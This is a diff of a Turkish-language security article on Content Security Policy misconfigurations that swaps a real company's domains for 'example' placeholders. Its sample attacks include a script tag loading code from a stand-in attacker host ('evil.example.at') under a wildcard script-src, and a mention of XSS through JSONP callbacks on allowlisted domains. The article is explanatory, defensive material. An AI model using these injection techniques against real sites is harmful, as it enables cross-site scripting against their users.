@@ -148,7 +148,7 @@ Bir CSP, directive adı verilen kurallardan oluşur. Her direktif, belirli kayna
 ### Content Security Policy Örneği
 Sunucu, tarayıcıya CSP’yi HTTP yanıtında iletebilir:
 ```http
-Content-Security-Policy: default-src 'self'; script-src 'self' https://*.example.com; object-src 'none'; img-src 'self' data: *.vaadata.com;
+Content-Security-Policy: default-src 'self'; script-src 'self' https://*.example.com; object-src 'none'; img-src 'self' data: *.example.com;
 ```
 
 Bu konfigürasyon:
@@ -180,12 +180,12 @@ eval() veya Function() çağrıları yapılabilir. Ayrıca data: şemasıyla Bas
 
 #### script-src'de wildcard (*) kullanımı
 ```http
-Content-Security-Policy: default-src 'none'; script-src https://vaadata.com *;
+Content-Security-Policy: default-src 'none'; script-src https://example.com *;
 ```
 
 Saldırgan kendi sunucusundan script yükleyebilir:
 ```js
-<script src="https://evil.vaadata.at"></script>
+<script src="https://evil.example.at"></script>
 ```
 
 ### object-src ve default-src eksikliği
@@ -200,7 +200,7 @@ Content-Security-Policy: script-src 'self'; img-src 'self';
 
 #### JSONP endpoint istismarı
 ```http
-Content-Security-Policy: default-src 'none'; script-src https://hello.vaadata.com/test.js https://accounts.google.com/o/oauth2/revoke;
+Content-Security-Policy: default-src 'none'; script-src https://hello.example.com/test.js https://accounts.google.com/o/oauth2/revoke;
 ```
 
 İzin verilen domainlerde JSONP endpoint varsa callback parametresi ile XSS yapılabilir:
